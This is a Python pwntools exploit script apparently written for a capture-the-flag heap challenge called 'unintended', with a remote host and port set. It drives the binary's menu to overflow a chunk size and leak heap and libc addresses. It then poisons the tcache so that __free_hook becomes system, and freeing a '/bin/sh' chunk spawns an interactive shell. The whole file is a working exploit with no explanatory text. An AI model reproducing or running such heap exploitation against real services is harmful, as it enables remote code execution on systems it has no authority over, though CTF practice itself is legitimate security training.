from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './unintended'
HOST = '193.57.159.27'
PORT = 59314
HOST = '172.17.0.2'
PORT = 888859314

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)
	# return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
	debug(r, [])

def a(idx, category, name, length, desc, point=11):
	r.sendlineafter('> ', '1')
	r.sendlineafter(': ', str(idx))
	r.sendlineafter(': ', category)
	r.sendlineafter(': ', name)
	r.sendlineafter(': ', str(length))
	r.sendafter(': ', desc)
	r.sendlineafter(': ', str(point))

def e(idx, desc):
	r.sendlineafter('> ', '2')
	r.sendlineafter(': ', str(idx))
	r.sendafter(': ', desc)

def s(idx):
	r.sendlineafter('> ', '3')
	r.sendlineafter(': ', str(idx))
def d(idx):
	r.sendlineafter('> ', '4')
	r.sendlineafter(': ', str(idx))

a(0, "web", "0", 0x428, "a"*0x18)
a(1, "web", "1", 0x18, "b"*0x18)
a(2, "web", "2", 0x18, "c"*0x18)
a(3, "web", "3", 0x18, 'd'*0x18)
a(4, "web", "4", 0x18, "e"*0x18)

e(1, 'Z'*0x18+'\xf1')
d(1)
d(2)
a(5, "web", "5", 0xe8, "d"*0x20)
s(5)
r.recvuntil('d'*0x20)
leak = u64(r.recvuntil('\n', True).ljust(8, '\x00'))
dbg('leak')
heap = leak - 0x770
d(0)
d(5)
payload = ''
payload += 'A'*0x38
payload += flat(0x21, 0, 0, 0, 0x41)
payload += 'A'*0x20
payload += p64(heap+0x2a0)
a(5, "web", "5", 0xe8, payload)
s(3)
r.recvuntil('Description: ')
leak = u64(r.recvuntil('\n', True).ljust(8, '\x00'))
dbg('leak')
base = leak - 0x3ebca0
dbg('base')
fh = base + 0x3ed8e8
system = base + 0x4f550
binsh = base + 0x1b3e1a

d(5)
payload = ''
payload += 'A'*0x38
payload += flat(0x21, fh - 8, 0, 0, 0x41)
payload += 'A'*0x20
payload += p64(heap+0x2a0)
a(5, "web", "5", 0xe8, payload)

a(6, "web", "6", 0x18, "B"*0x18)
a(7, "web", "7", 0x18, "/bin/sh\x00"+p64(system))
d(7)


r.interactive()
r.close()
